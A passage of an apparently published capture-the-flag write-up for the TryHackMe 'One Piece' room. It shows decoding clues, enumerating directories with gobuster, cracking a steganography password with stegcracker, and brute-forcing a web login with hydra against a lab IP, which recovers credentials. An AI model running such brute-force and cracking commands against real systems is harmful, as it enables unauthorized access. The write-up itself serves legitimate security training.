+</span></span><span class=line><span class=cl>      <span class=c>&lt;!--J5VEKNCJKZEXEUSDJZEE2MC2M5KFGWJTJMYFMV2PNE2UMWLJGFBEUVKWNFGFKRJQKJLUS5SZJBBEOS2FON3U4U3TFNLVO2ZRJVJXARCUGFHEOS2YKVWUWVKON5HEOQLVKEZGI3S2GJFEOSKTPBRFAMCGKVJEIODQKJUWQ3KMIMYUCY3LNBGUWMCFO5IGYQTWKJ4VMRK2KRJEKWTMGRUVCMCKONQTGTJ5--&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/One Piece$ echo -n &#39;J5VEKNCJKZEXEUSDJZEE2MC2M5KFGWJTJMYFMV2PNE2UMWLJGFBEUVKWNFGFKRJQKJLUS5SZJBBEOS2FON3U4U3TFNLVO2ZRJVJXARCUGFHEOS2YKVWUWVKON5HEOQLVKEZGI3S2GJFEOSKTPBRFAMCGKVJEIODQKJUWQ3KMIMYUCY3LNBGUWMCFO5IGYQTWKJ4VMRK2KRJEKWTMGRUVCMCKONQTGTJ5&#39; | base32 -d | base64 -d
+</span></span><span class=line><span class=cl>:18!R+D#G3F`M&amp;7+EV:.Eb-A%Eb-A4Eb/`pF(K05+&gt;Yi51*COSF)u&amp;)Ch4`.CgggbF!,[?ATD?)F(f,-@rHL+A0&gt;PoG%De4Df^&#34;CBlks
+</span></span></code></pre></td></tr></table></div></div><p><code>Nami ensures there are precisely 3472 possible places where she could have lost it.</code></p><p><a href=https://github.com/1FreyR/LogPose>https://github.com/1FreyR/LogPose</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/One Piece$ gobuster dir -u 10.10.93.198 -w LogPose.txt -x txt,php,html
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>Gobuster v3.0.1
+</span></span><span class=line><span class=cl>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>[+] Url:            http://10.10.93.198
+</span></span><span class=line><span class=cl>[+] Threads:        10
+</span></span><span class=line><span class=cl>[+] Wordlist:       LogPose.txt
+</span></span><span class=line><span class=cl>[+] Status codes:   200,204,301,302,307,401,403
+</span></span><span class=line><span class=cl>[+] User Agent:     gobuster/3.0.1
+</span></span><span class=line><span class=cl>[+] Extensions:     txt,php,html
+</span></span><span class=line><span class=cl>[+] Timeout:        10s
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/10/11 12:49:28 Starting gobuster
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>/dr3ssr0s4.html (Status: 200)
+</span></span><span class=line><span class=cl>Progress: 2041 / 3472 (58.78%)^C
+</span></span><span class=line><span class=cl>[!] Keyboard interrupt detected, terminating.
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/10/11 12:49:58 Finished
+</span></span><span class=line><span class=cl>===============================================================
+</span></span></code></pre></td></tr></table></div></div><p><a href=http://10.10.93.198/dr3ssr0s4.html>http://10.10.93.198/dr3ssr0s4.html</a></p><p><code>Donquixote Doflamingo</code></p><p><a href=view-source:http://10.10.93.198/css/dressrosa_style.css>view-source:http://10.10.93.198/css/dressrosa_style.css</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-css data-lang=css><span class=line><span class=cl><span class=p>#</span><span class=nn>container</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>height</span><span class=p>:</span> <span class=mi>75</span><span class=kt>vh</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>width</span><span class=p>:</span> <span class=mi>90</span><span class=kt>vw</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>margin</span><span class=p>:</span> <span class=mi>1</span><span class=kt>vh</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>background-image</span><span class=p>:</span> <span class=nb>url</span><span class=p>(</span><span class=s2>&#34;./writeups/tryhackme/one-piece/king_kong_gun.jpg&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>background-repeat</span><span class=p>:</span> <span class=kc>no-repeat</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>background-position</span><span class=p>:</span> <span class=kc>center</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>background-size</span><span class=p>:</span> <span class=kc>cover</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>display</span><span class=p>:</span> <span class=kc>flex</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>flex-direction</span><span class=p>:</span> <span class=kc>row</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>justify-content</span><span class=p>:</span> <span class=kc>center</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>align-items</span><span class=p>:</span> <span class=kc>flex-start</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>align-content</span><span class=p>:</span> <span class=kc>flex-start</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>flex-wrap</span><span class=p>:</span> <span class=kc>wrap</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>position</span><span class=p>:</span> <span class=kc>relative</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>kali</span><span class=err>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>One</span> <span class=n>Piece</span><span class=o>$</span> <span class=n>exiftool</span> <span class=n>king_kong_gun</span><span class=o>.</span><span class=n>jpg</span>
+</span></span><span class=line><span class=cl><span class=n>ExifTool</span> <span class=n>Version</span> <span class=n>Number</span>         <span class=p>:</span> <span class=mf>12.06</span>
+</span></span><span class=line><span class=cl><span class=ne>File</span> <span class=n>Name</span>                       <span class=p>:</span> <span class=n>king_kong_gun</span><span class=o>.</span><span class=n>jpg</span>
+</span></span><span class=line><span class=cl><span class=ne>Directory</span>                       <span class=p>:</span> <span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=ne>File</span> <span class=n>Size</span>                       <span class=p>:</span> <span class=mi>42</span> <span class=n>kB</span>
+</span></span><span class=line><span class=cl><span class=ne>File</span> <span class=n>Modification</span> <span class=n>Date</span><span class=o>/</span><span class=n>Time</span>     <span class=p>:</span> <span class=mi>2020</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>26</span> <span class=mi>13</span><span class=p>:</span><span class=mi>26</span><span class=p>:</span><span class=mi>42</span><span class=o>+</span><span class=mi>02</span><span class=p>:</span><span class=mi>00</span>
+</span></span><span class=line><span class=cl><span class=ne>File</span> <span class=n>Access</span> <span class=n>Date</span><span class=o>/</span><span class=n>Time</span>           <span class=p>:</span> <span class=mi>2020</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=mi>11</span> <span class=mi>12</span><span class=p>:</span><span class=mi>57</span><span class=p>:</span><span class=mi>18</span><span class=o>+</span><span class=mi>02</span><span class=p>:</span><span class=mi>00</span>
+</span></span><span class=line><span class=cl><span class=ne>File</span> <span class=n>Inode</span> <span class=n>Change</span> <span class=n>Date</span><span class=o>/</span><span class=n>Time</span>     <span class=p>:</span> <span class=mi>2020</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=mi>11</span> <span class=mi>12</span><span class=p>:</span><span class=mi>57</span><span class=p>:</span><span class=mi>03</span><span class=o>+</span><span class=mi>02</span><span class=p>:</span><span class=mi>00</span>
+</span></span><span class=line><span class=cl><span class=ne>File</span> <span class=n>Permissions</span>                <span class=p>:</span> <span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span>
+</span></span><span class=line><span class=cl><span class=ne>File</span> <span class=n>Type</span>                       <span class=p>:</span> <span class=n>JPEG</span>
+</span></span><span class=line><span class=cl><span class=ne>File</span> <span class=n>Type</span> <span class=n>Extension</span>             <span class=p>:</span> <span class=n>jpg</span>
+</span></span><span class=line><span class=cl><span class=n>MIME</span> <span class=n>Type</span>                       <span class=p>:</span> <span class=n>image</span><span class=o>/</span><span class=n>jpeg</span>
+</span></span><span class=line><span class=cl><span class=n>JFIF</span> <span class=n>Version</span>                    <span class=p>:</span> <span class=mf>1.01</span>
+</span></span><span class=line><span class=cl><span class=n>Resolution</span> <span class=n>Unit</span>                 <span class=p>:</span> <span class=n>inches</span>
+</span></span><span class=line><span class=cl><span class=n>X</span> <span class=n>Resolution</span>                    <span class=p>:</span> <span class=mi>72</span>
+</span></span><span class=line><span class=cl><span class=n>Y</span> <span class=n>Resolution</span>                    <span class=p>:</span> <span class=mi>72</span>
+</span></span><span class=line><span class=cl><span class=n>Comment</span>                         <span class=p>:</span> <span class=n>Doflamingo</span> <span class=n>is</span> <span class=o>/</span><span class=n>ko</span><span class=o>.</span><span class=n>jpg</span>
+</span></span><span class=line><span class=cl><span class=ne>Image</span> <span class=n>Width</span>                     <span class=p>:</span> <span class=mi>736</span>
+</span></span><span class=line><span class=cl><span class=ne>Image</span> <span class=n>Height</span>                    <span class=p>:</span> <span class=mi>414</span>
+</span></span><span class=line><span class=cl><span class=n>Encoding</span> <span class=n>Process</span>                <span class=p>:</span> <span class=n>Progressive</span> <span class=n>DCT</span><span class=p>,</span> <span class=n>Huffman</span> <span class=n>coding</span>
+</span></span><span class=line><span class=cl><span class=n>Bits</span> <span class=n>Per</span> <span class=ne>Sample</span>                 <span class=p>:</span> <span class=mi>8</span>
+</span></span><span class=line><span class=cl><span class=ne>Color</span> <span class=n>Components</span>                <span class=p>:</span> <span class=mi>3</span>
+</span></span><span class=line><span class=cl><span class=n>Y</span> <span class=n>Cb</span> <span class=n>Cr</span> <span class=n>Sub</span> <span class=n>Sampling</span>            <span class=p>:</span> <span class=n>YCbCr4</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=mi>0</span> <span class=p>(</span><span class=mi>2</span> <span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=ne>Image</span> <span class=n>Size</span>                      <span class=p>:</span> <span class=mi>736</span><span class=n>x414</span>
+</span></span><span class=line><span class=cl><span class=n>Megapixels</span>                      <span class=p>:</span> <span class=mf>0.305</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>strings ko.png
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Congratulations, this is the Log Pose that should lead you to the next island: /wh0l3_c4k3.php
+</span></span></code></pre></td></tr></table></div></div><p><a href=http://10.10.93.198/wh0l3_c4k3.php>http://10.10.93.198/wh0l3_c4k3.php</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  You are on Whole Cake Island. This is the territory of Big Mom, one of the 4
+</span></span><span class=line><span class=cl>  Emperors, this is to say one of the 4 pirates the closest to the One Piece but
+</span></span><span class=line><span class=cl>  also the strongest.<span class=p>&lt;</span><span class=nt>br</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>  Big Mom chases you and want to destroy you. It is unthinkable to fight her
+</span></span><span class=line><span class=cl>  directly.<span class=p>&lt;</span><span class=nt>br</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>  You need to find a way to appease her.
+</span></span><span class=line><span class=cl>  <span class=c>&lt;!--Big Mom likes cakes--&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/writeups/tryhackme/one-piece/2020-10-11_13-03.png alt></p><p><code>CakeForYou</code></p><p><img loading=lazy src=/writeups/tryhackme/one-piece/2020-10-11_13-04.png alt></p><p><a href=http://10.10.93.198/r4nd0m.html>http://10.10.93.198/r4nd0m.html</a></p><p><code>Buggy the Clown</code></p><p><a href=view-source:http://10.10.93.198/buggy_games/brain_teaser.js>view-source:http://10.10.93.198/buggy_games/brain_teaser.js</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>xDegOld</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>yDegOld</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>xDegNew</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>yDegNew</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>xCoordNew</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>yCoordNew</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>screenWidth</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;body&#34;</span><span class=p>).</span><span class=nx>clientWidth</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>screenWidth</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>screenHeight</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s2>&#34;body&#34;</span><span class=p>).</span><span class=nx>clientHeight</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>screenHeight</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>cube</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;container__animation&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>degDetermination</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nx>xDegOld</span> <span class=o>=</span> <span class=nx>xDegNew</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>yDegOld</span> <span class=o>=</span> <span class=nx>yDegNew</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>xDegNew</span> <span class=o>=</span> <span class=o>-</span><span class=p>(</span><span class=o>-</span><span class=mi>180</span> <span class=o>+</span> <span class=p>(</span><span class=nx>yCoordNew</span> <span class=o>/</span> <span class=nx>screenHeight</span><span class=p>)</span> <span class=o>*</span> <span class=mi>360</span><span class=p>)</span> <span class=o>/</span> <span class=mi>4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>yDegNew</span> <span class=o>=</span> <span class=p>(</span><span class=o>-</span><span class=mi>180</span> <span class=o>+</span> <span class=p>(</span><span class=nx>xCoordNew</span> <span class=o>/</span> <span class=nx>screenWidth</span><span class=p>)</span> <span class=o>*</span> <span class=mi>360</span><span class=p>)</span> <span class=o>/</span> <span class=mi>4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>cubeMovement</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nx>degDetermination</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=nx>cube</span><span class=p>.</span><span class=nx>animate</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span> <span class=nx>transform</span><span class=o>:</span> <span class=s2>&#34;rotateX(&#34;</span> <span class=o>+</span> <span class=nx>xDegOld</span> <span class=o>+</span> <span class=s2>&#34;deg) rotateY(&#34;</span> <span class=o>+</span> <span class=nx>yDegOld</span> <span class=o>+</span> <span class=s2>&#34;deg)&#34;</span> <span class=p>},</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span> <span class=nx>transform</span><span class=o>:</span> <span class=s2>&#34;rotateX(&#34;</span> <span class=o>+</span> <span class=nx>xDegNew</span> <span class=o>+</span> <span class=s2>&#34;deg) rotateY(&#34;</span> <span class=o>+</span> <span class=nx>yDegNew</span> <span class=o>+</span> <span class=s2>&#34;deg)&#34;</span> <span class=p>},</span>
+</span></span><span class=line><span class=cl>    <span class=p>],</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nx>duration</span><span class=o>:</span> <span class=mi>10</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>cube</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>transform</span> <span class=o>=</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;rotateX(&#34;</span> <span class=o>+</span> <span class=nx>xDegNew</span> <span class=o>+</span> <span class=s2>&#34;deg) rotateY(&#34;</span> <span class=o>+</span> <span class=nx>yDegNew</span> <span class=o>+</span> <span class=s2>&#34;deg)&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;back&#34;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span> <span class=s2>&#34;Log Pose: /0n1g4sh1m4.php&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>window</span><span class=p>.</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s2>&#34;mousemove&#34;</span><span class=p>,</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nx>xCoordNew</span> <span class=o>=</span> <span class=nx>e</span><span class=p>.</span><span class=nx>clientX</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>yCoordNew</span> <span class=o>=</span> <span class=nx>e</span><span class=p>.</span><span class=nx>clientY</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>cubeMovement</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span></code></pre></td></tr></table></div></div><p><a href=http://10.10.93.198/0n1g4sh1m4.php>http://10.10.93.198/0n1g4sh1m4.php</a></p><p><code>Kaido of the Beasts</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/One Piece$ stegcracker kaido.jpeg /usr/share/wordlists/rockyou.txt
+</span></span><span class=line><span class=cl>StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
+</span></span><span class=line><span class=cl>Copyright (c) 2020 - Luke Paris (Paradoxis)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Counting lines in wordlist..
+</span></span><span class=line><span class=cl>Attacking file &#39;kaido.jpeg&#39; with wordlist &#39;/usr/share/wordlists/rockyou.txt&#39;..
+</span></span><span class=line><span class=cl>Successfully cracked file with password: imabeast
+</span></span><span class=line><span class=cl>Tried 106372 passwords
+</span></span><span class=line><span class=cl>Your file has been written to: kaido.jpeg.out
+</span></span><span class=line><span class=cl>imabeast
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/One Piece$ cat kaido.jpeg.out
+</span></span><span class=line><span class=cl>Username:K1ng_0f_th3_B3@sts
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/One Piece$ hydra -l K1ng_0f_th3_B3@sts -P /usr/share/wordlists/rockyou.txt 10.10.93.198 http-post-form &#34;/0n1g4sh1m4.php:user=^USER^&amp;password=^PASS^&amp;submit_creds=Login:ERROR&#34; -t 64
+</span></span><span class=line><span class=cl>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-11 13:52:40
+</span></span><span class=line><span class=cl>[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+</span></span><span class=line><span class=cl>[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+</span></span><span class=line><span class=cl>[DATA] attacking http-post-form://10.10.93.198:80/0n1g4sh1m4.php:user=^USER^&amp;password=^PASS^&amp;submit_creds=Login:ERROR
+</span></span><span class=line><span class=cl>[STATUS] 10070.00 tries/min, 10070 tries in 00:01h, 14334329 to do in 23:44h, 64 active
+</span></span><span class=line><span class=cl>[80][http-post-form] host: 10.10.93.198   login: K1ng_0f_th3_B3@sts   password: thebeast
+</span></span><span class=line><span class=cl>1 of 1 target successfully completed, 1 valid password found
+</span></span><span class=line><span class=cl>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-11 13:54:35
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Unfortunately, the location of this last Poneglyph is unspecified.
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>From_Base32(&#39;A-Z2-7=&#39;,true)
+</span></span><span class=line><span class=cl>From_Morse_Code(&#39;Space&#39;,&#39;Line feed&#39;)
+</span></span><span class=line><span class=cl>From_Binary(&#39;Space&#39;)
+</span></span><span class=line><span class=cl>From_Hex(&#39;Auto&#39;)
+</span></span><span class=line><span class=cl>From_Base58(&#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#39;,true)
+</span></span><span class=line><span class=cl>From_Base64(&#39;A-Za-z0-9+/=&#39;,true)
+</span></span></code></pre></td></tr></table></div></div><p><code>M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!</code></p><p><a href=http://10.10.93.198/unspecified>http://10.10.93.198/unspecified</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>M0nk3y_D_7uffy@Laugh-Tale:~$ ls -la
+</span></span><span class=line><span class=cl>total 56
+</span></span><span class=line><span class=cl>drwxr-xr-x  8 M0nk3y_D_7uffy luffy 4096 Jul 29 07:32 .
+</span></span><span class=line><span class=cl>drwxr-xr-x  4 root           root  4096 Jul 26 07:54 ..
+</span></span><span class=line><span class=cl>-rw-------  1 M0nk3y_D_7uffy luffy   14 Aug 14 15:25 .bash_history
